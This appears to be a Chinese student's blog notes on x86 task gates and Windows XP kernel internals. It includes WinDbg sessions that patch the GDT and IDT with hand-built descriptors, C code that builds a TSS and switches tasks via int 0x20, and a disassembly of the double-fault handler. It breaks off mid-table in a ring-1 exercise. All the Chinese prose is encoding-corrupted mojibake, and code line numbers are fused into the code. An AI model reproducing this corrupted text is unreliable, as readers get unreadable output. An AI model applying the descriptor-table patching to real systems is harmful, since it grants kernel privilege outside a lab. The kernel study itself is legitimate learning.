åœ¨ä¸Šä¸€èŠ‚ä¸­è®²è§£äº†å¦‚ä½•é€šè¿‡CALLã€JMPæŒ‡ä»¤è®¿é—®ä»»åŠ¡æ®µã€‚ è¿™ä¸€èŠ‚è¯¾ä¸»è¦ä»‹ç»å¦‚ä½•é€šè¿‡ä»»åŠ¡é—¨å»è®¿é—®ä»»åŠ¡æ®µã€‚ IDTè¡¨åŒ…å«3ç§é—¨æè¿°ç¬¦ï¼š ä»»åŠ¡é—¨æè¿°ç¬¦ ä¸­æ–­é—¨æè¿°ç¬¦ é™·é˜±é—¨æè¿°ç¬¦ ä¸­æ–­ï¼Œé™·é˜±ä¹‹å‰è®²è¿‡äº†ã€‚ ä»»åŠ¡é—¨æè¿°ç¬¦ ä½32ä½ï¼ŒTSS Segment Selectoræ˜¯ä¸€ä¸ªæ®µé€‰æ‹©å­ï¼ŒæŒ‡å‘GDTè¡¨ä¸­çš„TSSæ®µæè¿°ç¬¦ã€‚ Reservedï¼Œä¿ç•™ä½ï¼Œå®éªŒæ—¶å¡«0ã€‚ ä»»åŠ¡é—¨æ‰§è¡Œæµç¨‹ INT Nï¼ŒNä¸ºä¸­æ–­é—¨ç´¢å¼•å· æŸ¥IDTè¡¨ï¼Œæ‰¾åˆ°ä»»åŠ¡é—¨æè¿°ç¬¦ é€šè¿‡ä»»åŠ¡é—¨æè¿°ç¬¦ä¸­çš„TSS Segment Selectorå­—æ®µï¼Œæ¥æŸ¥GDTè¡¨ï¼Œæ‰¾åˆ°ä»»åŠ¡æ®µæè¿°ç¬¦ ä½¿ç”¨TSSæ®µä¸­çš„å€¼ä¿®æ”¹å¯„å­˜å™¨ IRETDè¿”å› è¯¾åç»ƒä¹ é¢˜ è‡ªå·±å®ç°ä¸€ä¸ªä»»åŠ¡é—¨ å®éªŒè¿‡ç¨‹æ„é€ TSSæ®µæè¿°ç¬¦å’Œä»»åŠ¡é—¨æ®µæè¿°ç¬¦æµ‹è¯•ä»£ç è¿è¡Œæ„é€ TSSæ®µæè¿°ç¬¦ï¼Œæ”¹GDTè¡¨å’Œã€Šä»»åŠ¡æ®µã€‹æ–‡ç« ä¸€æ ·ï¼Œæ ¹æ®ä»£ç è¿è¡Œåçš„ç»ˆç«¯æç¤ºå¯¹GDTè¡¨è¿›è¡Œä¿®æ”¹12345678910111213kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000kd&gt; eq 8003f048 0000e912`fd780068kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0000e912`fd780068æ„é€ ä»»åŠ¡é—¨æ®µæè¿°ç¬¦ï¼Œæ”¹IDTè¡¨8003f048ï¼Œindexæ˜¯9TI=0ï¼ŒæŸ¥GDTè¡¨ROL=110000 0000 0100 1 0 110000 0000 0100 1011æ‰€ä»¥æ®µé€‰æ‹©å­æ˜¯0x4BReservedï¼š0000Pï¼š1DPLï¼š110Typeï¼š0101Reservedï¼š00TSS Segment Selectorï¼š004BReservedï¼š0000ç»¼ä¸Šï¼Œæ„é€ çš„ä»»åŠ¡é—¨æè¿°ç¬¦æ˜¯ï¼š0000e500`004b0000æ”¹8003f500è¿™ä¸ªPä½ä¸º0çš„æ— æ•ˆæ®µæè¿°ç¬¦ï¼ŒIndexæ˜¯32ï¼Œ0x20ã€‚æ‰€ä»¥ä»£ç ä¸­ç”¨int 0x2012345678910111213141516171819202122232425262728293031323334353637kd&gt; dq 8003f400 L218003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 00000000`00080000kd&gt; eq 8003f500 0000e500`004b0000kd&gt; dq 8003f400 L218003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 0000e500`004b0000å’Œcall ä»»åŠ¡æ®µä»£ç å¯¹æ¯”å®Œæ•´ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwOK;DWORD dwESP;DWORD dwCS;void __declspec(naked) func() &#123; dwOK=1; __asm &#123; //int 3 mov eax,esp mov dwESP,eax //å­˜ä»»åŠ¡åˆ‡æ¢åçš„espçš„å€¼ mov word ptr [dwCS],cs //å­˜ä»»åŠ¡åˆ‡æ¢åcsçš„å€¼ iretd //callæ–¹å¼è¿”å› &#125;&#125;int main()&#123; char buffer[6]; //æ„é€ ä»»åŠ¡æ®µ char stack[100]=&#123;0&#125;; //æ‰¾äº†ä¸€ä¸ªå±€éƒ¨å˜é‡çš„åœ°å€å½“å †æ ˆå †æ ˆç”¨ DWORD cr3=0; //æ„é€ TSSï¼Œæ³¨é‡Šæ ‡æœ‰*è¯´æ˜ä¸ºå¿…å¡«å€¼ DWORD tss[0x68]=&#123; //0x68ï¼Œ104å­—èŠ‚ 0x00000000, //linkï¼Œä¸Šä¸€ä¸ªä»»åŠ¡çš„TRæ®µé€‰æ‹©å­ã€‚åœ¨å‘ç”Ÿä»»åŠ¡åˆ‡æ¢æ—¶CPUä¼šè‡ªåŠ¨å¡«å…… 0x00000000, //esp0 0x00000000, //ss0 0x00000000, //esp1 0x00000000, //ss1 0x00000000, //esp2 0x00000000, //ss2 cr3, //cr3* (DWORD)func, //eip * è·³è½¬çš„åœ°å€ 0x00000000, //eflags 0x00000000, //eax 0x00000000, //ecx 0x00000000, //edx 0x00000000, //ebx ((DWORD)stack) + 100, //esp * 0x00000000, //ebp 0x00000000, //esi 0x00000000, //edi 0x00000023, //es * 0x00000008, //cs * 3ç¯ï¼š0x1B 0x00000010, //ss * 3ç¯ï¼š0x23 0x00000023, //ds * 0x00000030, //fs * 3ç¯ï¼š0x3B 0x00000000, //gs 0x00000000, //ldt 0x20ac0000 //IOæƒé™ä½å›¾ï¼ŒVISTAä¹‹åä¸å†ç”¨äº†ï¼Œè¿™æ˜¯ä»ç°æœ‰çš„TSSç»“æ„ä½“æ‹·å‡ºæ¥çš„ &#125;; //è¾“å‡ºçœ‹((DWORD)stack) + 100çš„åœ°å€ï¼Œåé¢ç”¨windbgçœ‹ä»»åŠ¡åˆ‡æ¢çš„espä½œå¯¹æ¯”ç”¨ printf(&quot;Address of the ((DWORD)stack) + 100 :%p &quot;,((DWORD)stack) + 100); //ä¿®æ”¹GDTè¡¨ printf(&quot;Address of the tss array: %p &quot;, tss); // Print the 1st (leftmost) hexadecimal digit, 2nd hexadecimal digit, and the low 16 bits of the tss array address printf(&quot;1st Hex Digit: %02x, 2nd Hex Digit: %02x, Low 16 bits: %04x &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (DWORD)tss &amp; 0x0000FFFF); printf(&quot;In WinDbg, modify your constructed Task Segment Descriptor in the GDT table using the following command: eq 8003f048 %02x00e9%02x`%04x0068 &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (WORD)tss); //å› ä¸ºå˜é‡å£°æ˜é¡ºåºçš„é—®é¢˜ï¼Œè¾“å…¥cr3çš„è¯­å¥åœ¨è¿™é‡Œã€‚ç„¶åå†èµ‹ç»™tssæ•°ç»„é‡Œçš„cr3å­—æ®µ printf(&quot;After running this executable, execute !process 0 0 in WinDbg, copy the value of DirBase for the TSS.exe process, and input it below. CR3: &quot;); scanf(&quot;%x&quot;,&amp;cr3); //æ‰§è¡Œè¯¥exeåï¼Œåœ¨WinDbgä¸­ç”¨è¯¥æŒ‡ä»¤è·å–ï¼š!process 0 0 tss[7]=cr3;- *(DWORD*)(&amp;buffer[0])=0x12345678;- *(WORD*)(&amp;buffer[4])=0x48; //æ®µé€‰æ‹©å­0x48ï¼Œæ‹†å®Œç´¢å¼•åˆ°çš„æ˜¯8003f048 __asm &#123;- call fword ptr [buffer];+ int 0x20 //ç´¢å¼•å·32ï¼Œ8003f500+ //eq 8003f500 0000e500`004b0000 &#125; printf(&quot;ok = %x ESP = %x CS = %x &quot;,dwOK,dwESP,dwCS); return 0;&#125;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwOK;DWORD dwESP;DWORD dwCS;void __declspec(naked) func() &#123; dwOK=1; __asm &#123; //int 3 mov eax,esp mov dwESP,eax //å­˜ä»»åŠ¡åˆ‡æ¢åçš„espçš„å€¼ mov word ptr [dwCS],cs //å­˜ä»»åŠ¡åˆ‡æ¢åcsçš„å€¼ iretd &#125;&#125;int main()&#123; char stack[100]=&#123;0&#125;; //æ‰¾äº†ä¸€ä¸ªå±€éƒ¨å˜é‡çš„åœ°å€å½“å †æ ˆå †æ ˆç”¨ DWORD cr3=0; //æ„é€ TSSï¼Œæ³¨é‡Šæ ‡æœ‰*è¯´æ˜ä¸ºå¿…å¡«å€¼ DWORD tss[0x68]=&#123; //0x68ï¼Œ104å­—èŠ‚ 0x00000000, //linkï¼Œä¸Šä¸€ä¸ªä»»åŠ¡çš„TRæ®µé€‰æ‹©å­ã€‚åœ¨å‘ç”Ÿä»»åŠ¡åˆ‡æ¢æ—¶CPUä¼šè‡ªåŠ¨å¡«å…… 0x00000000, //esp0 0x00000000, //ss0 0x00000000, //esp1 0x00000000, //ss1 0x00000000, //esp2 0x00000000, //ss2 cr3, //cr3* (DWORD)func, //eip * è·³è½¬çš„åœ°å€ 0x00000000, //eflags 0x00000000, //eax 0x00000000, //ecx 0x00000000, //edx 0x00000000, //ebx ((DWORD)stack) + 100, //esp * 0x00000000, //ebp 0x00000000, //esi 0x00000000, //edi 0x00000023, //es * 0x00000008, //cs * 3ç¯ï¼š0x1B 0x00000010, //ss * 3ç¯ï¼š0x23 0x00000023, //ds * 0x00000030, //fs * 3ç¯ï¼š0x3B 0x00000000, //gs 0x00000000, //ldt 0x20ac0000 //IOæƒé™ä½å›¾ï¼ŒVISTAä¹‹åä¸å†ç”¨äº†ï¼Œè¿™æ˜¯ä»ç°æœ‰çš„TSSç»“æ„ä½“æ‹·å‡ºæ¥çš„ &#125;; //è¾“å‡ºçœ‹((DWORD)stack) + 100çš„åœ°å€ï¼Œåé¢ç”¨windbgçœ‹ä»»åŠ¡åˆ‡æ¢çš„espä½œå¯¹æ¯”ç”¨ printf(&quot;Address of the ((DWORD)stack) + 100 :%p &quot;,((DWORD)stack) + 100); //ä¿®æ”¹GDTè¡¨ printf(&quot;Address of the tss array: %p &quot;, tss); // Print the 1st (leftmost) hexadecimal digit, 2nd hexadecimal digit, and the low 16 bits of the tss array address printf(&quot;1st Hex Digit: %02x, 2nd Hex Digit: %02x, Low 16 bits: %04x &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (DWORD)tss &amp; 0x0000FFFF); printf(&quot;In WinDbg, modify your constructed Task Segment Descriptor in the GDT table using the following command: eq 8003f048 %02x00e9%02x`%04x0068 &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (WORD)tss); //å› ä¸ºå˜é‡å£°æ˜é¡ºåºçš„é—®é¢˜ï¼Œè¾“å…¥cr3çš„è¯­å¥åœ¨è¿™é‡Œã€‚ç„¶åå†èµ‹ç»™tssæ•°ç»„é‡Œçš„cr3å­—æ®µ printf(&quot;After running this executable, execute !process 0 0 in WinDbg, copy the value of DirBase for the TSS.exe process, and input it below. CR3: &quot;); scanf(&quot;%x&quot;,&amp;cr3); //æ‰§è¡Œè¯¥exeåï¼Œåœ¨WinDbgä¸­ç”¨è¯¥æŒ‡ä»¤è·å–ï¼š!process 0 0 tss[7]=cr3; __asm &#123; int 0x20 //ç´¢å¼•å·32ï¼Œ8003f500 //eq 8003f500 0000e500`004b0000 &#125; printf(&quot;ok = %x ESP = %x CS = %x &quot;,dwOK,dwESP,dwCS); return 0;&#125;ç¼–è¯‘è¿è¡Œæ”¹GDTè¡¨12345678910111213kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000kd&gt; eq 8003f048 0000e912`fd780068kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0000e912`fd780068æ”¹IDTè¡¨12345678910111213141516171819202122232425262728293031323334353637kd&gt; dq 8003f400 L218003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 00000000`00080000kd&gt; eq 8003f500 0000e500`004b0000kd&gt; dq 8003f400 L218003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 0000e500`004b0000IDTè¡¨å¯ä»¥æ‰§è¡Œexeå‰å°±æ”¹äº†ï¼Œå¦‚æœæ‰§è¡Œåè¿æ”¹ä¸¤ä¸ªè¡¨ï¼Œå¯èƒ½å› ä¸ºæˆ‘ç”µè„‘é—®é¢˜ï¼Œwindbgä¼šä¸€ç›´BUSYä½¿ç”¨!process 0 0æŸ¥çœ‹è¯¥exeçš„DirBaseï¼Œè¾“å…¥åˆ°ç»ˆç«¯è¿è¡ŒæˆåŠŸï¼Œæ‰§è¡Œè¿‡ç¨‹æ²¡é‡åˆ°é”™è¯¯ åœ¨ä¿æŠ¤æ¨¡å¼ä¸­ï¼Œå½“CPUæ£€æµ‹åˆ°å¼‚å¸¸çš„æ—¶å€™ï¼Œä¼šæ ¹æ®å¼‚å¸¸çš„ç±»å‹æ¥æŸ¥æ‰¾å¯¹åº”çš„å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œæ¯”å¦‚:å½“æŒ‡ä»¤æ£€æµ‹åˆ°é™¤é›¶å¼‚æ—¶,å°†é»˜è®¤æ‰§è¡Œ0å·ä¸­æ–­ï¼Œè¯·åˆ—å‡ºå¤„ç†é™¤é›¶å¼‚å¸¸å‡½æ•°çš„åœ°å€ã€‚ ç­”æ¡ˆå‚è€ƒï¼šæ®µå’Œé—¨å°ç»“-ç»ƒä¹ 7-ç¾½å¤çš„åšå®¢ä¸ºä»€ä¹ˆä»»åŠ¡æ®µå¯ä»¥ç”¨call farè®¿é—®è¿˜è¦æœ‰ä»»åŠ¡é—¨-SDâ€™Blog12kd&gt; dq 8003f400 L28003f400 80538e00`0008f19c 80538e00`0008f3140å·ä¸­æ–­ï¼Œ80538e00`0008f19cå¤„ç†é™¤é›¶å¼‚å¸¸å‡½æ•°çš„åœ°å€ï¼š8053f19c12345678910kd&gt; u 8053f19cnt!KiTrap00:8053f19c 6a00 push 08053f19e 66c74424020000 mov word ptr [esp+2],08053f1a5 55 push ebp8053f1a6 53 push ebx8053f1a7 56 push esi8053f1a8 57 push edi8053f1a9 0fa0 push fs8053f1ab bb30000000 mov ebx,30huå‘½ä»¤ï¼Œåæ±‡ç¼–æŒ‡å®šåœ°å€å¤„çš„ä»£ç  åœ¨ä¿æŠ¤æ¨¡å¼ä¸­ï¼Œå½“CPUæ£€æµ‹åˆ°å¼‚å¸¸çš„æ—¶å€™ï¼Œä¼šæ ¹æ®å¼‚å¸¸çš„ç±»å‹æ¥æŸ¥æ‰¾å¯¹åº”çš„å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œæ¯”å¦‚:å½“æŒ‡ä»¤æ£€æµ‹åˆ°é™¤é›¶å¼‚å¸¸æ—¶ï¼Œå°†é»˜è®¤æ‰§è¡Œ0å·ä¸­æ–­æ‰€æŒ‡å®šçš„å¼‚å¸¸å¤„ç†ç¨‹åºï¼Œä½†æ˜¯ï¼Œå¼‚å¸¸å¤„ç†ç¨‹åºæœ¬èº«ä»»ç„¶å¯èƒ½å‡ºç°å¼‚å¸¸ï¼Œå¦‚æœå¼‚å¸¸å¤„ç†ç¨‹åºå‡ºç°å¼‚å¸¸æ—¶å€™ï¼ˆåŒé‡é”™è¯¯ï¼‰ï¼ŒCPUä¼šé»˜è®¤æ‰§è¡Œ8å·ä¸­æ–­ï¼Œè¯·åˆ†æ8å·ä¸­æ–­æ˜¯ä»€ä¹ˆ?åšäº†ä»€ä¹ˆäº‹æƒ…?æ›¿æ¢äº†å“ªäº›å¯„å­˜å™¨?æ›¿æ¢åçš„å€¼æ˜¯å¤šå°‘?ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡? ç­”æ¡ˆ123456kd&gt; dq 8003f400 L98003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`005011988å·ä¸­æ–­00008500`00501198Pä½æ˜¯1ï¼Œæœ‰æ•ˆã€‚Sä½ä¸º0ï¼Œç³»ç»Ÿæ®µã€‚Typeä¸º5ï¼Œè¿™æ˜¯ä¸ªä»»åŠ¡é—¨ã€‚TSS Segment Selectoræ˜¯00500000 0000 0101 00000000 0000 0101 0 0 00indexæ˜¯10çœ‹å¯¹åº”GDTè¡¨ä¸­çš„æè¿°ç¬¦ï¼š1234567kd&gt; dq 8003f000 LB8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffa00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`000000008003f050 80008954`af000068TSSæ®µæè¿°ç¬¦80008954`af000068ï¼Œbaseæ˜¯8054af00çœ‹è¿™å—TSSä¸Šçš„eipå­—æ®µ123456789kd&gt; dd 8054af008054af00 00000000 80547f00 00000010 000000008054af10 00000000 00000000 00000000 00b180008054af20 805404ce 00000000 00000000 000000008054af30 00000000 00000000 80547f00 000000008054af40 00000000 00000000 00000023 000000088054af50 00000010 00000023 00000030 000000008054af60 00000000 20ac0000 00000000 80547f008054af70 00000010 00000000 00000000 00000000ç¬¬8ä¸ªï¼ˆ0~8ï¼‰æ˜¯eipï¼Œå³805404ce1234567891011121314151617181920212223242526kd&gt; uf 805404cent!KiTrap08:805404ce fa cli805404cf 8b0d3cf0dfff mov ecx,dword ptr ds:[0FFDFF03Ch]805404d5 8d4150 lea eax,[ecx+50h]805404d8 c6400589 mov byte ptr [eax+5],89h805404dc 9c pushfd805404dd 812424ffbfffff and dword ptr [esp],0FFFFBFFFh805404e4 9d popfd805404e5 a13cf0dfff mov eax,dword ptr ds:[FFDFF03Ch]805404ea 8a6857 mov ch,byte ptr [eax+57h]805404ed 8a4854 mov cl,byte ptr [eax+54h]805404f0 c1e110 shl ecx,10h805404f3 668b4852 mov cx,word ptr [eax+52h]805404f7 a140f0dfff mov eax,dword ptr ds:[FFDFF040h]805404fc 890d40f0dfff mov dword ptr ds:[0FFDFF040h],ecxnt!KiTrap08+0x34:80540502 6a00 push 080540504 6a00 push 080540506 6a00 push 080540508 50 push eax80540509 6a08 push 88054050b 6a7f push 7Fh8054050d e8048dfbff call nt!KeBugCheck2 (804f9216)80540512 ebee jmp nt!KiTrap08+0x34 (80540502)åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå¯èƒ½ä¼šå‡ºç°ä¸€ä¸ªå¼‚å¸¸ã€‚å½“å¼‚å¸¸äº§ç”Ÿæ—¶ï¼Œå³é”™è¯¯äº§ç”Ÿæ—¶ï¼ŒCPUä¼šèµ°æŒ‡å®šä¸­æ–­è¿›è¡Œå¼‚å¸¸å¤„ç†ã€‚ä½†åœ¨å¼‚å¸¸å¤„ç†è¿‡ç¨‹ä¸­ï¼Œä¹Ÿå¯èƒ½ä¼šå‘ç”Ÿé”™è¯¯ã€‚å¦‚æœå†æ¬¡å‘ç”Ÿé”™è¯¯ï¼ŒCPUå°†ä¼šèµ°8å·ä¸­æ–­ï¼Œå³æ‰€è°“çš„åŒé‡é”™è¯¯ã€‚int 8æ˜¯å¦‚ä½•æ¥ç®¡å¤„ç†çš„å‘¢ï¼Ÿä¸€æ—¦è¿›å…¥8å·ä¸­æ–­ï¼Œå°†ä¼šæ›¿æ¢ä¸€å †å¯„å­˜å™¨ï¼Œä¿è¯CPU èƒ½è·³åˆ°ä¸€ä¸ªæ­£ç¡®çš„åœ°æ–¹å»æ‰§è¡Œï¼ˆé™¤éé‚£ä¸ªåœ°æ–¹ä¹Ÿè¢«ç ´åäº†ï¼‰ï¼Œæ­¤æ—¶ä»€ä¹ˆé”™è¯¯éƒ½æ— æ‰€è°“äº†ï¼Œæ”¶é›†ä¿¡æ¯åï¼Œè“å±ã€‚å¯¹äºWindowsç³»ç»Ÿæ¥è¯´ï¼ŒåŸºæœ¬å°±æ˜¯ä»¥è“å±çš„å½¢å¼å‡ºç°ã€‚æœªæ¥To do:8å·ä¸­æ–­å…·ä½“å‡½æ•°å†…å®¹ï¼Œè¦ç”¨IDAçœ‹ï¼Œæœªæ¥çœ‹ã€‚å¦‚ä½•çœ‹å‚è€ƒç¾½å¤çš„åšå®¢ æ€è€ƒé¢˜ æ—¢ç„¶å·²ç»æœ‰ä»»åŠ¡æ®µäº†ï¼Œä¸ºä»€ä¹ˆè¿˜è¦æœ‰ä»»åŠ¡é—¨å‘¢ï¼Ÿ ç­”æ¡ˆ1-ä¸€å®¶ä¹‹è¨€æˆ‘æ„Ÿè§‰è¿™ä¸ªç­”æ¡ˆæ¯”ç­”æ¡ˆ2æ›´å¥½ã€‚ç­”æ¡ˆå‚è€ƒï¼šè§†é¢‘åŒå­¦çš„å›ç­”+ä¸ºä»€ä¹ˆä»»åŠ¡æ®µå¯ä»¥ç”¨call farè®¿é—®è¿˜è¦æœ‰ä»»åŠ¡é—¨-SDâ€™Blogä¸Šé¢é¢˜ç›®åˆ†æäº†8å·ä¸­æ–­ï¼Œå°±æ˜¯ç”¨çš„ä»»åŠ¡é—¨ã€‚æ‰€ä»¥ä»»åŠ¡é—¨ä¸ºå¼‚å¸¸(INT)æä¾›äº†ä¸€ç§å¯åˆ‡æ¢ä»»åŠ¡çš„æœºåˆ¶,æ˜¯ä¸€ç§è¢«åŠ¨çš„æœºåˆ¶ã€‚è€Œå•çº¯çš„ä»»åŠ¡æ®µå¿…é¡»è¢«ä¸»åŠ¨è°ƒç”¨(CALL JMP)ã€‚ç­”æ¡ˆ2-ä¸€å®¶ä¹‹è¨€æ¥è‡ªï¼šä»»åŠ¡é—¨è¿›1ç¯-çœ‹é›ª-è¯„è®ºåŒºwx_å¤§å¯çˆ±çš„å›ç­”å¦‚æœä½ ç”¨jmpè·³åˆ°TSSæ®µï¼Œä½ è¿˜å¾—è‡ªå·±jmpå›åˆ°ä¹‹å‰çš„TRå¯„å­˜æ‰€ä¿å­˜çš„TSSæ®µã€‚å¦‚æœæ˜¯callçš„è¯ä½ è¿˜å¾—ä¿®æ”¹ä¸‹EFLAGå¯„å­˜å™¨çš„NTä½ï¼Œä¹‹åç”¨iretè¿”å›ã€‚è¿˜ä¸å¦‚ç›´æ¥ç”¨çŠ¶æ€é—¨ï¼Œåªéœ€è¦æä¸€ä¸ªä»»åŠ¡é—¨ï¼Œä¹‹åç›´æ¥iretè¿”å›ï¼Œä¸éœ€è¦ä¿®æ”¹EFLAGå’Œä¸éœ€è¦è‡ªå·±jmpå›æ¥.è¿™ä¹Ÿè®¸å°±æ˜¯ä»»åŠ¡é—¨çš„ä¼˜ç‚¹å§ è€ƒè¯•é¢˜ï¼šä½¿ç”¨ä»»åŠ¡é—¨è¿›1ç¯ å®éªŒè¿‡ç¨‹åˆ†æä»£ç è¿è¡Œè°ƒè¯•å‚è€ƒé“¾æ¥ï¼šæ®µå’Œé—¨å°ç»“-ç¾½å¤çš„åšå®¢ä»»åŠ¡é—¨è¿›1ç¯-çœ‹é›ªcså’Œsséœ€è¦è‡ªå·±æ„é€ 1ç¯ä¸‹ï¼Œcså’Œssçš„å€¼ï¼Œcså’Œssåœ¨GDTè¡¨ä¸­çš„æ®µæè¿°ç¬¦ã€‚æ ¹æ®ã€Šæ®µæƒé™æ£€æŸ¥ã€‹CPLç« èŠ‚çŸ¥ï¼Œcså’Œssçš„åä¸¤ä½è¦ä¸€æ ·ï¼Œå› ä¸ºåœ¨1ç¯ï¼Œæ‰€ä»¥éƒ½æ˜¯01ã€‚é‚£indexå‘¢ï¼Ÿindexæ˜¯GDTè¡¨çš„ç´¢å¼•ï¼Œcsçš„indexåˆ°GDTè¡¨æ˜¯ä»£ç æ®µï¼Œssçš„indexåˆ°GDTè¡¨æ˜¯æ•°æ®æ®µï¼ˆä¸ªäººç†è§£ï¼šå°±æ˜¯å­˜æ”¾æ•°æ®çš„å†…å­˜ï¼Œæ‹¿æ¥å½“å †æ ˆç”¨ï¼‰ã€‚åˆ†æä¸€ä¸‹æˆ‘ä»¬ä¹‹å‰0ç¯å’Œ3ç¯çš„cså’Œssï¼Œç„¶åç”¨å®ƒä»¬çš„indexçœ‹ä¸‹å¯¹åº”GDTè¡¨ä¸­å“ªäº›æè¿°ç¬¦ï¼Œç„¶åæ„é€ 1ç¯ä¸‹cså’Œssçš„æ®µæè¿°ç¬¦ã€‚cs:0x1Bcs:0x08å‡ ç¯3ç¯0ç¯åå…­è¿›åˆ¶0000 0000 0001 10110000 0000 0000 1000æŒ‰å­—æ®µæ‹†0000 0000 0001 1 0 110000 0000 0000 1 0 00Index31TI00CPL30ss:0x23ss:0x10å‡ ç¯3ç¯0ç¯åå…­è¿›åˆ¶0000 0000 0010 00110000 0000 0001 0000æŒ‰å­—æ®µæ‹†0000 0000 0010 0 0 110000 0000 0001 0 0 00Index42TI00CPL30åºå·åœ°å€æ®µæè¿°ç¬¦Pä½æœ‰æ•ˆoræ— æ•ˆSä½TYPEåŸŸï¼ˆç¬¬ä¸‰ä¸ªåå…­è¿›åˆ¶æ•°ï¼‰æ•°æ®æ®µorä»£ç æ®µDPL18003f00800cf9b00`0000ffff1æœ‰æ•ˆ1â‰¥8ï¼Œ1011ä»£ç æ®µ0028003f01000cf9300`0000ffff1æœ‰æ•ˆ1ï¼œ8ï¼Œ0011æ•°æ®æ®µ0038003f01800cffa00`0000ffff1æœ‰æ•ˆ1â‰¥8ï¼Œ1010ä»£ç 